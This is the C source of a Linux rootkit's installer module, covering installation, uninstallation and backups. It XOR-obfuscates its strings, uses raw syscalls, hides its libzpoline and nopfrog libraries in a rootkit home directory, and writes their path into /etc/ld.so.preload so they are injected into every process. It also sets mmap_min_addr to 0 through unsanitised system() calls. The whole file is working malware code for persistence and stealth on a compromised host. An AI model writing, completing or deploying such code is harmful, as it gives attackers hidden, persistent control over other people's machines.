#include <sys/stat.h>
#include "../rkconsts.h"

/* 
    Handles rootkit home directory setup, installing, uninstalling,
    making backups of key files, self-destruct etc. 
*/

int is_rk_home_setup(void) {
    struct stat rkh_buf; 
    char *rk_home = strdup(RK_HOME); xor(rk_home);
    if (syscall(4, rk_home, &rkh_buf) != -1) {
        if (S_ISDIR(rkh_buf.st_mode)) {
            char *libz = strdup(LIBZPOLINE_FILE_NAME); xor(libz);
            char *libn = strdup(NOPFROG_FILE_NAME); xor(libn);
            struct stat libz_buf;
            struct stat libn_buf;
            if ((syscall(4, libz, &libz_buf) != -1) && (syscall(4, libn, &libn_buf) != -1 )) {
                DEBUG_MSG("[-] Rootkit is already set up in home directory %s\n", rk_home);
                CLEAN(libz);
                CLEAN(libn);
                CLEAN(rk_home);
                return 1;
            }
        }
    }
    CLEAN(rk_home);
    return 0;
}

int setup_rk_home(char *libzpoline_path, char *nopfrog_path) {
    DEBUG_MSG("[-] setup_rk_home() called\n");
    // make rk home directory 
    char *mkdir = strdup(MKDIR); xor(mkdir);
    char *rk_home = strdup(RK_HOME); xor(rk_home);
    char cmd[2048];
    sprintf(cmd, "%s %s", mkdir, rk_home);
    DEBUG_MSG("[-] cmd: %s\n", cmd);
    system(cmd);
    DEBUG_MSG("[-] Set up rookit home dir\n");

    // move libzpoline there
    memset(cmd, 0x0, 2048);
    char *mv = strdup(MV); xor(mv);
    sprintf(cmd, "%s %s %s", mv, libzpoline_path, rk_home);
    DEBUG_MSG("[-] cmd: %s\n", cmd);
    system(cmd);
    DEBUG_MSG("[-] Placed libzpoline in rootkit home dir\n");

    // move nopfrog.so there
    memset(cmd, 0x0, 2048);
    sprintf(cmd, "%s %s %s", mv, nopfrog_path, rk_home);
    DEBUG_MSG("[-] cmd: %s\n", cmd);
    system(cmd);
    DEBUG_MSG("[-] Placed nopfrog in rootkit home dir\n");

    // make directory for backups
    memset(cmd, 0x0, 2048);
    char *rk_backup = strdup(RK_BACKUP); xor(rk_backup);
    sprintf(cmd, "%s %s%s", mkdir, rk_home, rk_backup);
    DEBUG_MSG("[-] cmd: %s\n", cmd);
    system(cmd);
    DEBUG_MSG("[-] Created rootkit backup directory\n");

    // cleanup
    CLEAN(mkdir);
    CLEAN(rk_home);
    CLEAN(mv);
    CLEAN(rk_backup);
    return 1;
}

int write_to_ld_so_preload(char *ld_path) {
    DEBUG_MSG("[-] write_to_ld_so_preload() called\n")
    DEBUG_MSG("[-] ld_path: %s\n", ld_path);
    char *ld_so_preload_path = strdup(LD_SO_PRELOAD_PATH); xor(ld_so_preload_path);
    int fd = syscall(2, ld_so_preload_path, O_RDWR|O_CREAT, 0644);
    if (syscall(1, fd, ld_path, strlen(ld_path)) != -1) {
        DEBUG_MSG("[-] Wrote rk_home path to /etc/ld.so.preload\n");
        CLEAN(ld_so_preload_path);
        return 1;
    }
    DEBUG_MSG("[-] Failed to write rk_home path to /etc/ld.so.preload\n");
    CLEAN(ld_so_preload_path);
    return 0;
}

int backup_ld_so_preload(char *ld_path) {
    DEBUG_MSG("[-] backup_ld_so_preload() called\n")
    char *rk_home = strdup(RK_HOME); xor(rk_home);
    char *rk_backup = strdup(RK_BACKUP); xor(rk_backup);
    if (syscall(2, ld_path, O_RDWR) != -1) {
        char cmd[2048];
        sprintf(cmd, "cp %s %s%s", ld_path, rk_home, rk_backup);
        DEBUG_MSG("[-] cmd: %s\n", cmd);
        system(cmd);
        DEBUG_MSG("[-] Backed up /etc/ld.so.preload\n"); 
        CLEAN(rk_backup);
        CLEAN(rk_home);
        return 1;
    }
    CLEAN(rk_backup);
    CLEAN(rk_home);
    return 1;
}

int has_backup_ld_so_preload(void) {
    DEBUG_MSG("[-] has_backup_ld_so_preload() called\n")
    struct stat ld_buf;
    char ld_backup_path[2048];
    char *rk_home = strdup(RK_HOME); xor(rk_home);
    char *rk_backup = strdup(RK_BACKUP); xor(rk_backup);
    char *ld_preload_so = strdup(LD_SO_PRELOAD); xor(ld_preload_so);
    sprintf(ld_backup_path, "%s%s%s", rk_home, rk_backup, ld_preload_so);
    int ret = (syscall(4, ld_backup_path, &ld_buf) != -1);
    
    CLEAN(rk_home);
    CLEAN(rk_backup);
    CLEAN(ld_preload_so);
    return ret;
}

int install_rk(char *libzpoline_path, char *nopfrog_path){
    DEBUG_MSG("[-] install_rk() called\n")
    char *rk_home = strdup(RK_HOME); xor(rk_home);
    char *rk_backup = strdup(RK_BACKUP); xor(rk_backup);
    if (is_rk_home_setup()) {
        char *libz = strdup(LIBZPOLINE_FILE_NAME); xor(libz);
        char ld_path[2048];
        sprintf(ld_path, "%s%s", rk_home, libz);
        DEBUG_MSG("[-] rk_path: %s\n", ld_path);
        if (write_to_ld_so_preload(ld_path)) {
            CLEAN(rk_home);
            CLEAN(rk_backup);
            CLEAN(libz);
            return 1;
        }
    }
    else {
        // installing for first time
        if(setup_rk_home(libzpoline_path, nopfrog_path)) {
            char *ld_so_preload_path = strdup(LD_SO_PRELOAD_PATH); xor(ld_so_preload_path); 
            // Back up /etc/ld.so.preload if it exists
            backup_ld_so_preload(ld_so_preload_path);
            // TODO: Back mmap_min_addr up as well 
            // Set mmap_min_addr to 0
            DEBUG_MSG("[-] Setting mmap_min_addr\n");
            char *set_mmap_min_addr = strdup(SET_MMAP_MIN_ADDR); xor(set_mmap_min_addr);
            system(set_mmap_min_addr);
            char *libz = strdup(LIBZPOLINE_FILE_NAME); xor(libz);
            char ld_path[2048];
            sprintf(ld_path, "%s%s", rk_home, libz);
            // Write lib path to /etc/ld.so.preload
            CLEAN(rk_home);
            CLEAN(rk_backup);
            CLEAN(set_mmap_min_addr);
            CLEAN(libz);
            CLEAN(ld_so_preload_path);
            if (write_to_ld_so_preload(ld_path)) {
                return 1;
            }
            DEBUG_MSG("[-] Failed to write rk_home path to /etc/ld.so.preload\n");
            return 0;
        }
    }
    CLEAN(rk_home);
    CLEAN(rk_backup);
    return 0;
}

int uninstall_rk(){
    DEBUG_MSG("[-] uninstall_rk() called\n")
    char *rk_home = strdup(RK_HOME); xor(rk_home);
    char *rk_backup = strdup(RK_BACKUP); xor(rk_backup);
    char *ld_path = strdup(LD_SO_PRELOAD_PATH); xor(ld_path);
    char *ld_backup = strdup(LD_SO_PRELOAD); xor(LD_SO_PRELOAD);
    char ld_backup_path[2048];
    sprintf(ld_backup_path, "%s%s%s", rk_home, rk_backup, ld_backup);
    struct stat ld_buf;

    // check if we have a backup for /etc/ld.so.preload
    if (syscall(4, ld_backup_path, &ld_buf) != -1) {
        // we have a backup, so put the original back
        char cmd[2048];
        char *mv = strdup(MV); xor(mv);
        sprintf(cmd, "%s %s %s", mv, ld_backup_path, ld_path);
        system(cmd);
        DEBUG_MSG("[-] Restored /etc/ld.so.preload from backup\n");
        CLEAN(rk_home);
        CLEAN(rk_backup);
        CLEAN(ld_path);
        CLEAN(ld_backup);
        CLEAN(mv);
        return 1;
    }
    else {
        char cmd[2048];
        char *rm = strdup(RM); xor(RM);
        sprintf(cmd, "%s %s", rm, ld_path);
        DEBUG_MSG("[-] Removed /etc/ld.so.preload\n");
        CLEAN(rk_home);
        CLEAN(rk_backup);
        CLEAN(ld_path);
        CLEAN(ld_backup);
        CLEAN(rm);
        return 1;
    }
    
}

// int wipe_rk(void) {

// }